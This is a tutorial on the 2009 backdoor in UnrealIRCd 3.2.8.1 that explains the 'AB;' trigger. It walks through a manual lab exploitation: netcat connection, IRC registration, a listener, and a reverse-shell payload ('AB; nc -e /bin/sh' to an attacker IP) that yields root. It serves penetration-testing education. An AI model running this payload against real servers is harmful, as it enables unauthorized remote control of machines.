# UnrealIRCd 3.2.8.1 Vulnerability & Exploitation Guide

## 🌐 What is UnrealIRCd?
Before exploring the vulnerability, we need to understand what UnrealIRCd is.
* UnrealIRCd is a popular and open-source IRC (Internet Relay Chat) server.
* In simple terms, an IRC server is a software application that allows people from all over the world to talk and chat with each other in real-time, using chat rooms (channels) or private messages.
* Think of it like a traditional chat platform or a communication hub. UnrealIRCd provides the backend infrastructure that makes this real-time communication possible.

---

## 💬 A Quick Look at IRC
Before UnrealIRCd and modern chat apps, people needed a way to talk to each other online.
* Back then, long before modern apps like Discord, WhatsApp, or Telegram, IRC was the main way to do it. It was like the old-school version of Discord!
* It was a simple, text-based chat system where developers, gamers, and online communities from all over the world could meet in chat rooms and talk in real-time.
* UnrealIRCd is just a specific software used to run one of these chat servers.

---

## 📜 A Brief Historical Note
Before exploring the technical details of the vulnerability, it is important to understand how it came to exist.
* In November 2009, an unknown attacker secretly compromised the official distribution archives of UnrealIRCd version 3.2.8.1.
* They modified the source code on the official download mirrors to include a malicious backdoor (trojan).
* This hidden code remained undetected for months, until it was officially uncovered and reported in June 2010.
* Unlike typical coding bugs or software flaws, this vulnerability was a deliberate insertion at the source level.
* It was triggered by a specific secret command prefix—namely, the characters " AB; "
* This allowed any remote user to execute arbitrary system commands with the full privileges of the user running the IRC daemon, requiring zero authentication.

---

## ⚙️ What is the Vulnerability?
The UnrealIRCd backdoor is a classic example of command injection caused by malicious code added directly to the software's source code.
* When the IRC server processes incoming data, it checks for a specific secret trigger: the characters AB;.
* If the server finds this prefix at the beginning of a command, it takes whatever text comes right after it and passes it directly to the system's underlying shell (like bash).
* Because the IRC server runs with specific user privileges on the host machine, whatever command is injected after AB; will be executed by the operating system with those exact same privileges.
* The biggest danger of this vulnerability is that it requires no authentication. Anyone on the internet can connect to the IRC server port, send the hidden trigger with a system command, and take control of the target machine instantly.

---

## 🎯 Exploitation Methods
When it comes to exploiting this vulnerability, there are two methods.
1. The primitive method that Script Kiddies rely on: using pre-made exploits in Metasploit just to get a quick full control on the server.
2. The manual method. In this article, we will follow the manual method because I dislike the tool-based approach.
   > If you prefer using automated tools without wanting to understand how they actually work, then this article is not for you.

---

## 🛠️ How to exploit:
Okay, the IP address of the current device we will be exploiting the vulnerability on is 192.168.56.104
Let's assume you've checked the system and found that UnrealIRCd version 3.2.8 is running and operating on its default port, 6667.

First, we'll need to connect to that port using Netcat with the command:
```
nc -nv 192.168.56.104 6667
```
Why are we doing this? And what does this command mean?
* nc: Stands for Netcat, a versatile networking utility used for reading and writing data across network connections.
* -n: Tells Netcat to disable DNS lookups to speed up the connection.
* -v: Enables verbose mode to output detailed connection status.
* 192.168.56.104 6667: Specifies the target IP and standard IRC port 6667.

![netcat_irc_connection_established.png]()

After we connected to UnrealIRCd, we need to do a simple login.:
```
NICK hacker
USER alpha-bet 0 * : real alpha
```
Why are we doing this? And what does this command mean?
* `NICK hacker`: Assigns a nickname to our current session on the server.
* `USER alpha-bet 0 * : real alpha`: Registers the user details required by the IRC protocol specifications to keep the connection stable in the server's parser loop.

![irc_user_nick_registration.png]()

Now that we are connected, it is time to deploy the exploit.
As we discussed, the backdoor listens for the secret " AB; " trigger.
Whatever command you type right after it will be executed instantly by the operating system under the privileges of the user running the IRC daemon.
Of course, typing single commands one by one is not enough.
For complete and direct control over the target, we need something much better: 
a full, interactive reverse shell.
Before we create the reverse shell, we must create our listening method. Now we open the new terminal and type :
```
nc -nvlp 5050
```
Why are we doing this? And what does this command mean?
* nc: Netcat utility.
* -n: Numeric-only IP addresses.
* -v: Verbose output.
* -l: Listen mode to wait for incoming connections.
* -p 5050: Specifies the local port to monitor.

![local_listener_netcat_port_5050.png]()

Now we'll go to the terminal where we initially opened the connection to the server. We'll then type the second command to perform a reverse shell.:
```
AB; nc -e /bin/sh 192.168.56.101 5050
```
Why are we doing this? And what does this command mean?
* `AB;` : The secret backdoor trigger hardcoded in the vulnerable source code.
* `nc -e /bin/sh` : Executes Netcat and pipes the system shell directly through the socket.
* `192.168.56.101 5050` : The attacker's IP and listening port.

![unrealircd_backdoor_payload_injection.png]()

And now we have successfully received the reverse shell connection.:

![reverse_shell_successful_connection.png]()

Now we whoami command:

![root_privileges_whoami_confirmation.png]()

Boom! We've entered the system with root privileges.
